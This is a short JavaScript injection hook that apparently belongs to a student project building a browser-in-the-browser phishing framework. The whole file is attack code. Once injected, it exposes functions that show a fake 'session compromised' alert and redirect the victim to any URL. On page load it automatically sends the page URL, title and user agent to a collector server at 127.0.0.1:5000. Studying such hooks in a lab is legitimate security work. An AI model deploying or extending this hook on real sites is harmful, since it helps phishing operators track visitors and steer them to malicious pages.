// Simple Self-Made Hook for BitB-Framework FYP
console.log("=== Simple BitB Hook Injected ===");

window.bitb = {
  popup: function(msg) {
    alert(msg || "Your session has been compromised!");
  },
  redirect: function(url) {
    window.location.href = url || "https://youtube.com";
  }
};

// Auto send browser info
fetch('http://127.0.0.1:5000/log', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    type: 'browserInfo',
    data: {
      url: location.href,
      title: document.title,
      userAgent: navigator.userAgent
    }
  })
});
